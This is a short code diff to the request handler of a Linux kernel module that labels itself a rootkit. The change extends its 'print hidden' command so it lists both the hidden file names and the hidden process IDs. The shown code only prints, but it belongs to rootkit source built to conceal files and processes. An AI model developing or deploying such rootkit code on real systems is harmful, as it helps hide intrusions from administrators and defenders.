@@ -77,9 +77,15 @@ void handle_request(const char __user* buff, size_t len){
 			break;
 		case 5: // PRINT HIDDEN
 			printk(KERN_INFO "ROOTKIT: Hidden files: ");
-			struct list_files_node* node;
-			list_for_each_entry(node, &list_files, list){
-				printk(KERN_CONT "%s, ", node->name);
+			struct list_files_node* node_file;
+			struct list_pids_node* node_pid;
+			list_for_each_entry(node_file, &list_files, list){
+				printk(KERN_CONT "%s, ", node_file->name);
+			}
+			printk(KERN_CONT "\n");
+			printk(KERN_INFO "ROOTKIT: Hidden pids: ");
+			list_for_each_entry(node_pid, &list_pids, list){
+				printk(KERN_CONT "%d, ", node_pid->pid);
 			}
 			printk(KERN_CONT "\n");
 			break;
